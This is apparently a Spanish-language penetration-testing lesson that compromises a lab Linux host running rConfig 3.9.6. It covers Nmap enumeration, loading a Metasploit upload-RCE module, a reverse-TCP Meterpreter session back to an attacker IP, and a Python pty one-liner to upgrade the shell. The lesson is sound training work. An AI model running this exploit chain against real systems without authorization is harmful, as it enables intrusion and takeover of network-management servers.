W3Techs mantiene un estudio continuo de estadísticas de uso de OS [study](https://w3techs.com/technologies/overview/operating_system). Este estudio informa que más del `70%` de los sitios web (servidores web) funcionan con un sistema basado en Unix. Para nosotros, esto significa que podemos beneficiarnos significativamente al continuar creciendo nuestro conocimiento de Unix/Linux y cómo podemos obtener sesiones shell en estos entornos para potencialmente pivotar dentro de un entorno. Aunque es común que las organizaciones utilicen terceros y proveedores de nube para alojar sus sitios web y aplicaciones web, muchas organizaciones aún alojan sus sitios web y aplicaciones web en servidores dentro de sus entornos de red (on-prem). En estos casos, querríamos establecer una sesión shell con el sistema subyacente para intentar pivotar a otros sistemas en la red interna.

---

## Common Considerations

Como habrás notado, obtener una sesión shell con un sistema se puede hacer de varias maneras; una forma común es a través de una vulnerabilidad en una aplicación. Identificaremos una vulnerabilidad y descubriremos un exploit que podemos usar para obtener una shell entregando un payload. Al considerar cómo estableceremos una sesión shell en un sistema Unix/Linux, nos beneficiaremos de considerar lo siguiente:

- ¿Qué distribución de Linux está ejecutando el sistema?
- ¿Qué shell y lenguajes de programación existen en el sistema?
- ¿Qué función está sirviendo el sistema para el entorno de red en el que está?
- ¿Qué aplicación está alojando el sistema?
- ¿Hay alguna vulnerabilidad conocida?

Vamos a profundizar en este concepto atacando una aplicación vulnerable alojada en un sistema Linux. Mantén las preguntas en mente y toma notas mientras pasamos por esto. ¿Puedes responderlas?

---

## Gaining a Shell Through Attacking a Vulnerable Application

Como en la mayoría de los compromisos, comenzaremos con una enumeración inicial del sistema usando `Nmap`.

### Enumerate the Host

```r
nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Manteniendo nuestro objetivo de `gaining a shell session` en mente, debemos establecer algunos próximos pasos después de examinar nuestra salida de escaneo.

`What information could we gather from the output?`

Considerando que podemos ver que el sistema está escuchando en los puertos 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`) y 21 (`FTP`), puede ser seguro asumir que este es un servidor web que aloja una aplicación web. También podemos ver algunos números de versión asociados con la pila web (`Apache 2.4.6` y `PHP 7.2.34`) y la distribución de Linux que ejecuta el sistema (`CentOS`). Antes de decidir una dirección para investigar más a fondo (adentrarse en un agujero de conejo), también deberíamos intentar navegar a la dirección IP a través de un navegador web para descubrir la aplicación alojada, si es posible.

### rConfig Management Tool

![image](https://academy.hackthebox.com/storage/modules/115/rconfig.png)

Aquí descubrimos una herramienta de gestión de configuración de red llamada [rConfig](https://www.rconfig.com/). Esta aplicación es utilizada por administradores de red y sistemas para automatizar el proceso de configuración de dispositivos de red. Un caso práctico sería usar rConfig para configurar remotamente interfaces de red con información de direccionamiento IP en múltiples routers simultáneamente. Esta herramienta ahorra tiempo a los administradores, pero, si se compromete, podría usarse para pivotar a dispositivos de red críticos que conmutan y enrutan paquetes a través de la red. Un atacante malicioso podría controlar toda la red a través de rConfig, ya que probablemente tendrá acceso de administrador a todos los dispositivos de red utilizados para configurar. Como pentesters, encontrar una vulnerabilidad en esta aplicación se consideraría un descubrimiento muy crítico.

---

## Discovering a Vulnerability in rConfig

Echa un vistazo de cerca al final de la página de inicio de sesión web, y podemos ver el número de versión de rConfig (`3.9.6`). Debemos usar esta información para comenzar a buscar cualquier `CVEs`, `publicly available exploits`, y `proof of concepts` (`PoCs`). A medida que investigamos, asegúrate de observar de cerca lo que encontramos y entender lo que está haciendo. Por supuesto, queremos que nos lleve a una sesión shell con el objetivo.

Usar tu motor de búsqueda preferido dará algunos resultados prometedores. Podemos usar las palabras clave: `rConfig 3.9.6 vulnerability.`

![image](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)

Podemos ver que puede valer la pena elegir esto como el enfoque principal de nuestra investigación. El mismo pensamiento podría aplicarse a las versiones de Apache y PHP, pero dado que la aplicación se ejecuta en la pila web, veamos si podemos obtener una shell a través de un exploit escrito para las vulnerabilidades encontradas en rConfig.

También podemos usar la funcionalidad de búsqueda de Metasploit para ver si hay módulos de exploit que puedan darnos una sesión shell en el objetivo.

### Search For an Exploit Module

```r
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```

Un detalle que puede pasarse por alto al confiar en MSF para encontrar un módulo de exploit para una aplicación específica es la versión de MSF. Puede haber módulos de exploit útiles que no estén instalados en nuestro sistema o que simplemente no aparezcan en la búsqueda. En estos casos, es bueno saber que Rapid 7 mantiene el código para los módulos de exploit en sus [repos en github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). Podríamos hacer una búsqueda aún más específica usando un motor de búsqueda: `rConfig 3

.9.6 exploit metasploit github`

Esta búsqueda puede señalarnos el código fuente de un módulo de exploit llamado `rconfig_vendors_auth_file_upload_rce.rb`. Este exploit puede darnos una sesión shell en una caja Linux objetivo que ejecute rConfig 3.9.6. Si este exploit no aparece en la búsqueda de MSF, podemos copiar el código de este repo en nuestra caja de ataque local y guardarlo en el directorio que nuestra instalación local de MSF esté referenciando. Para hacer esto, podemos emitir este comando en nuestra caja de ataque:

### Locate

```r
locate exploits
```

Queremos buscar los directorios en la salida asociados con Metasploit Framework. En Pwnbox, los módulos de exploit de Metasploit se guardan en:

`/usr/share/metasploit-framework/modules/exploits`

Podemos copiar el código en un archivo y guardarlo en `/usr/share/metasploit-framework/modules/exploits/linux/http` similar a donde están guardando el código en el repo de GitHub. También deberíamos mantener msf actualizado usando los comandos `apt update; apt install metasploit-framework` o tu administrador de paquetes local. Una vez que encontremos el módulo de exploit y lo descarguemos (podemos usar wget) o lo copiemos en el directorio adecuado desde Github, podemos usarlo para obtener una sesión shell en el objetivo. Si lo copiamos en un archivo en nuestro sistema local, asegúrate de que el archivo tenga `.rb` como extensión. Todos los módulos en MSF están escritos en Ruby.

---

## Using the rConfig Exploit and Gaining a Shell

En msfconsole, podemos cargar manualmente el exploit usando el comando:

### Select an Exploit

```r
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Con este exploit seleccionado, podemos listar las opciones, ingresar los ajustes adecuados específicos para nuestro entorno de red y lanzar el exploit.

Usa lo que has aprendido en el módulo hasta ahora para completar las opciones asociadas con el exploit.

### Execute the Exploit

```r
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

Podemos ver en los pasos descritos en el proceso de explotación que este exploit:

- Verifica la versión vulnerable de rConfig
- Se autentica con el inicio de sesión web de rConfig
- Sube un payload basado en PHP para una conexión de shell inversa
- Elimina el payload
- Nos deja con una sesión shell Meterpreter

### Interact With the Shell

```r

meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

Podemos entrar en una shell del sistema (`shell`) para obtener acceso al sistema objetivo como si estuviéramos conectados y abrir una consola CMD.exe.

---

## Spawning a TTY Shell with Python

Cuando entramos en la shell del sistema, notamos que no hay un prompt presente, pero aún podemos emitir algunos comandos del sistema. Esta es una shell típicamente referida como una `non-tty shell`. Estas shells tienen funcionalidad limitada y a menudo pueden impedirnos el uso de comandos esenciales como `su` (`switch user`) y `sudo` (`super user do`), que probablemente necesitaremos si buscamos escalar privilegios. Esto sucedió porque el payload fue ejecutado en el objetivo por el usuario apache. Nuestra sesión se establece como el usuario apache. Normalmente, los administradores no acceden al sistema como el usuario apache, por lo que no hay necesidad de que un lenguaje intérprete de shell esté definido en las variables de entorno asociadas con apache.

Podemos generar manualmente una sesión TTY shell usando Python si está presente en el sistema. Siempre podemos verificar la presencia de Python en sistemas Linux escribiendo el comando: `which python`. Para generar la sesión TTY shell usando Python, escribimos el siguiente comando:

### Interactive Python

```r
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

Este comando utiliza python para importar el [pty module](https://docs.python.org/3/library/pty.html), luego usa la función `pty.spawn` para ejecutar el `bourne shell binary` (`/bin/sh`). Ahora tenemos un prompt (`sh-4.2$`) y acceso a más comandos del sistema para movernos por el sistema a nuestro antojo.

`Now, let's test our knowledge with some challenge questions.`